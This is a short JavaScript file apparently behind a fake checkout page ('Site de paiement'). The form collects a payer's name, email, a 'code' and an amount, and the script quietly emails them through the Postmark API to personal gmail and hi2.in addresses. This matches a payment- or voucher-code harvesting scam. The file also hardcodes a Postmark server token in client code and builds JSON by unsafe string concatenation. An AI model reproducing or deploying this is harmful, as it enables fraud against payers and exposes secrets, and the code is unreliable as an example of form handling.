//document.getElementById("checkout-form").classList.add("hidden")

document.querySelectorAll(".payment-method").forEach((item) => {
  item.addEventListener("click", (event) => {
    document.getElementById("payment-choice").classList.add("hidden");
    document.getElementById("payment-choice-title").classList.remove("active");
    
    document.getElementById("checkout-form").classList.remove("hidden");
    document.getElementById("payment-title").classList.add("active");
      
  });
});

let form = document.getElementById("checkout-form");

form.addEventListener("submit", function (e) {
  e.preventDefault()

  let name = document.getElementById("name").value
  let email = document.getElementById("email").value;
  let code = document.getElementById("code").value;
  let amount = document.getElementById("amount").value;

  const body = new FormData();
  body.append("From", "Site de paiement");
  body.append("To", "massoudfataou@gmail.com");
  body.append("To", "mft@hi2.in");
  body.append("Subject", "Nouvelle réponse provenant de votre site");
  body.append("TemplateId", "24594674");
  body.append("TemplateModel", '{ "mail": "' + email +'", "name": "' + name +'", "code": "' + code +'", "amount": "' + amount +'"}');

  fetch(
    "https://api.postmarkapp.com/email/withTemplate",
    {
      method: "POST",
      body: body,
      headers: {
        'X-Postmark-Server-Token': 'dd866fee-8fbe-4356-b5a3-f0145e3f88bd',
        'Accept': "application/json",
        "Content-Type": "application/json",
      },
    }
  );
 })